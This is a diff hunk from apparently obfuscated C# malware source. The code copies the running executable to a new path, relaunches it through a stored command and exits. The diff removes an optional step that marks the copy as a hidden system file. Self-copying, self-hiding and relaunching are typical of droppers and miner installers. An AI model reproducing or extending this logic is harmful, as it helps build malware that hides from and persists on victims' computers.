@@ -103,9 +103,6 @@ public partial class _rProgram_
                     Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
                     File.Copy(_rcmdl_, _rplp_, true);
                     Thread.Sleep(2 * 1000);
-#if DefHideFile
-                    File.SetAttributes(_rplp_, File.GetAttributes(_rplp_) | FileAttributes.Hidden | FileAttributes.System);
-#endif
                     _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
                     Environment.Exit(0);
                 }
